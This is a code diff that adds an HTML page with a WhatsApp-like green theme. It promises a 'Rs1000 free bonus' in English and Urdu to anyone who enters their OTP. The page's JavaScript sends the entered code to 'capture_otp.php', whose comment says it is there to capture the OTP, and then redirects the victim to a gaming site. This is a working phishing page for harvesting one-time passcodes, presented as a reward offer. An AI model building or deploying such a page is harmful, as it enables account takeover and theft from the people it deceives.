@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter OTP</title>
+
+    <!-- Link to Google Fonts for a professional look -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;700&display=swap" rel="stylesheet">
+
+    <!-- External CSS for basic styling -->
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            animation: backgroundAnimation 10s ease infinite;
+        }
+
+        @keyframes backgroundAnimation {
+            0% {
+                background: linear-gradient(135deg, #25D366, #128C7E);
+            }
+            50% {
+                background: linear-gradient(135deg, #128C7E, #25D366);
+            }
+            100% {
+                background: linear-gradient(135deg, #25D366, #128C7E);
+            }
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.9);
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 400px;
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #333;
+        }
+
+        .otp-input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: calc(100% - 20px);
+            margin-bottom: 20px;
+        }
+
+        .submit-btn {
+            background-color: #25D366;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            text-decoration: none;
+            border-radius: 50px;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #1ebe58;
+        }
+
+        .urdu-text {
+            font-family: 'Noto Nastaliq Urdu', serif;
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+    </style>
+
+    <script>
+        // JavaScript function to handle OTP submission and redirection
+        function submitOTP() {
+            var otp = document.querySelector('.otp-input').value;
+
+            if (otp) {
+                // Send OTP to backend via POST
+                var form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'capture_otp.php'; // Changed to capture the OTP
+
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'otp';
+                input.value = otp;
+
+                form.appendChild(input);
+                document.body.appendChild(form);
+
+                // Submit the form using AJAX to ensure OTP is sent before redirect
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'capture_otp.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        // Redirect after successful submission
+                        window.location.href = 'https://www.pakgames.net/#/';
+                    }
+                };
+
+                xhr.send('otp=' + encodeURIComponent(otp)); // Send the OTP via AJAX
+            } else {
+                alert('Please enter your OTP.');
+            }
+        }
+    </script>
+
+</head>
+<body>
+
+    <!-- Main container -->
+    <div class="container">
+        <h1>Enter Your OTP and get 🪙Rs1000 free bonus</h1>
+
+        <div class="urdu-text">اپنا او ٹی پی نمبر درج کر کے اپنا انعام عاصل کرے</div>
+
+        <input type="text" class="otp-input" placeholder="Enter OTP" required>
+
+        <!-- Button triggers the JavaScript function to submit OTP -->
+        <button class="submit-btn" onclick="submitOTP()">Submit</button>
+    </div>
+
+</body>
+</html>
